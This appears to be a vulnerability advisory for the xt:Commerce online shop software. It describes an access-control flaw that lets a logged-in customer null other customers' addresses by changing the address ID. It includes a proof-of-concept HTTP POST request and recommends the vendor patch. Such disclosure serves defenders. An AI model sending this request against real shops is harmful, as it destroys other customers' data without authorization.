
Overview:

xt:Commerce is an online shop software.

The product can be described as an online shop software which is mostly
used in German speaking regions. It is written in PHP and is available
as both a free and paid version. xt:Commerce can also be extended via
plug-ins.

Due to improper access control, a logged-in user can clear other user
addresses.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

A logged-in customer can create and alter addresses. These addresses are
referenced by incrementing IDs. On saving an address, an attacker could
change the ID of the address to write the data to. If the ID belongs to
an address which does not belong to the current logged-in user, every
field in the address is set to null. An attacker could use this to null
all addresses in a shop.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

Sending the following request with an existing address ID belonging to
another customer nulls the fields for the inserted address ID:


POST /de/customer?page_action=edit_address HTTP/1.1
[...]

action=edit_address&address_book_id=[addressId]&old_address_class=
default&address_class=default&customers_company=&customers_gender=m&
customers_firstname=Pen&customers_lastname=Test&customers_street_address=
Test&customers_postcode=12345&customers_city=Test&customers_country_code=DE&
customers_phone=123456789&customers_fax=&customers_mobile_phone=
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

Apply patch provided by the manufacturer.
